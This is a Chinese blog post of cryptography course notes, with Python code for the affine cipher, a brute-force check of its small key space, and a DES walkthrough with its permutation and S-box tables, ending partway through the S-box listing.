    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于放假了，整理一波之前密码学笔记和课程设计<a id="more"></a>；</p><h1 id="古典密码仿射"><a href="#古典密码仿射" class="headerlink" title="古典密码仿射"></a>古典密码仿射</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>仿射密码，是古典密码里面比较经典的替换密码，在我看来就是将移位密码和数乘密码结合到了一起；</p><p>加密方程：<code>C=(k1*M+k2)mod26</code>；</p><p>解密方程：<code>M=(C-k2)*(k1^-1)mod26</code>；</p><p>其中k1必须与26互素，这样才可以产生k1的逆元用于解密；没有对k1的限制，可能无法解密。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><p>这里的p为需要加密的明文，k1,k2就是上述的两个密钥，先看明文需要加密几个字母，有几个字母就产生几轮循环，每次循环将字母先转换为0~25的数字，然后进行数乘和移位变换，然后再转换为字符，存储在一个字符变量c中，直到循环结束为止，这就得到了密文；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fangshe</span><span class="params">(p,k1,k2)</span>:</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">temp=chr((((ord(p[i])-ord(<span class="string">'a'</span>))*k1+k2)%<span class="number">26</span>)+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=temp</span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="判断最大公因数"><a href="#判断最大公因数" class="headerlink" title="判断最大公因数"></a>判断最大公因数</h3><p>如果需要解密，则必须要使得k1能够产生对26的逆元，即要使k1和26互素，所以判断k1和26是否最大公约数为1;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">temp=y</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,temp+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span>((x%i==<span class="number">0</span>) <span class="keyword">and</span> (y%i==<span class="number">0</span>)):</span><br><span class="line">s=i</span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><p>解密首先要判断k1和26是否互素，互素才可以解密，在互素的前提下计算k1对于26的逆元：k1_re，然后用解密放生进行循环解密即可输出明文；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a,b,str1)</span>:</span></span><br><span class="line">c1=<span class="string">""</span></span><br><span class="line"><span class="keyword">if</span>(gcd(a,<span class="number">26</span>)==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span>((a*i)%<span class="number">26</span>==<span class="number">1</span>):</span><br><span class="line">k1_re=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">temp=chr((((ord(str1[i])-ord(<span class="string">'a'</span>))-b)*k1_re)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c1+=temp</span><br><span class="line"><span class="keyword">return</span> c1</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>刚写python，比较丑……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#仿射加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fangshe</span><span class="params">(p,k1,k2)</span>:</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">temp=chr((((ord(p[i])-ord(<span class="string">'a'</span>))*k1+k2)%<span class="number">26</span>)+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=temp</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#判断最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">temp=y</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,temp+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span>((x%i==<span class="number">0</span>) <span class="keyword">and</span> (y%i==<span class="number">0</span>)):</span><br><span class="line">s=i</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"><span class="comment">#仿射解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a,b,str1)</span>:</span></span><br><span class="line">c1=<span class="string">""</span></span><br><span class="line"><span class="keyword">if</span>(gcd(a,<span class="number">26</span>)==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span>((a*i)%<span class="number">26</span>==<span class="number">1</span>):</span><br><span class="line">k1_re=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">temp=chr((((ord(str1[i])-ord(<span class="string">'a'</span>))-b)*k1_re)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c1+=temp</span><br><span class="line"><span class="keyword">return</span> c1</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" EncryptInput "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">p=raw_input(<span class="string">"Please enter the plain:"</span>)</span><br><span class="line">k1=input(<span class="string">"Please enter k1:"</span>)</span><br><span class="line">k2=input(<span class="string">"Please enter k2:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Encryption "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">c=fangshe(p,k1,k2)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Cipher:"</span>+c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" DecryptInput "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">C=raw_input(<span class="string">"Please enter the Cipher:"</span>)</span><br><span class="line">key1=input(<span class="string">"Please enter k1:"</span>)</span><br><span class="line">key2=input(<span class="string">"Please enter k2:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Decryption "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">plain=decode(key1,key2,C)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Plain:"</span>+plain</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性"><a href="#运行结果及正确性" class="headerlink" title="运行结果及正确性"></a>运行结果及正确性</h2><p>输入明文hellocumt，k1=7,k2=2加密所得的密文用仿射解密得出原来的明文，所以正确性得到验证</p><p><img src="https://s2.ax1x.com/2019/01/02/FIEyNt.png" alt="结果"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>1.仿射密码对于任意两个不同的字母，其最后得到的密文肯定不一样；所以当密文长度足够长时，我们可以使用频率分析的方法来解决。利用仿射密码时，一般只有 26 个字母，而不大于 26 的与 26 互素的个数一共有12个，算上偏移量，也就是大概12x26=312种可能性。</p><p>一般来说，对于该种密码，至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。</p><p>已知部分明密文对：<code>y1=(ax1+b)mod26</code>     <code>y2=(ax2+b)(mod26)</code>   </p><p>两式相减：<code>y1−y2=a(x1−x2)(mod26)</code>很容易得到a，得到了a即可解出b</p><p>2.对密文直接用312个密钥空间进行暴破，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">plain=<span class="string">"zebbwqmif"</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line">k=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">res=chr((ord(plain[x])-ord(<span class="string">'a'</span>)-j)*k[i]%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=res</span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#+'\n'</span></span><br><span class="line"><span class="keyword">if</span> c==<span class="string">"hellocumt"</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"find it"</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br></pre></td></tr></table></figure><p>运行结果：找到有意义的密文</p><p><img src="https://s2.ax1x.com/2019/01/13/FvvqPA.png" alt="FvvqPA.png"></p><h1 id="对称加密DES"><a href="#对称加密DES" class="headerlink" title="对称加密DES"></a>对称加密DES</h1><h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p><img src="https://s2.ax1x.com/2019/01/03/FoEdsg.md.png" alt="FoEdsg.md.png"></p><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>1.输入8位字符密钥转换为64位二进制；</p><p>2.经过64位密钥经过PC-1置换为56位；</p><p>3.将56位分成两部分分别进行循环左移；</p><p>4.左移后组合，再进入PC-2置换为48位，第一轮密钥生成结束；</p><p>5.循环左移以后的两部分继续循环左移，再次进入PC-2置换，生成48位子密钥，如此进行16轮，存储16个48位的子密钥</p><h3 id="加密处理"><a href="#加密处理" class="headerlink" title="加密处理"></a>加密处理</h3><p>1.输入的字符先转换为二进制，每64位为一组进行加密；</p><p>2.每一组64位的二进制先进行IP置换打乱；</p><p>3.然后将64位分成2部分，分别放入Li和Ri</p><p>4.将Ri经过F函数处理，再与Li异或，然后将值赋给R(i+1)</p><p>5.将Ri赋值给L(i+1)</p><p>6.最后一轮，直接将Ri赋给R(i+1),再将Ri经过F函数处理，再与Li异或，然后将值赋给L(i+1)</p><p>7.将L和R合并后经过逆IP盒，得到密文C</p><h3 id="F函数"><a href="#F函数" class="headerlink" title="F函数"></a>F函数</h3><p>1.先将输入的32位Ri进行扩展置换E，转换为48位</p><p>2.再与生成的子密钥进行异或</p><p>3.将异或后的值经过S盒压缩为32位</p><p>4.再进行P置换打乱顺序</p><h2 id="加密详细过程"><a href="#加密详细过程" class="headerlink" title="加密详细过程"></a>加密详细过程</h2><h3 id="各个置换dict"><a href="#各个置换dict" class="headerlink" title="各个置换dict"></a>各个置换dict</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dic_IP=[<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">dic_key1=[<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">dic_key2=[<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">dic_e=[<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">dic_s=[[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>],[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>],[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>],[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>],[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>],[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>],[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span 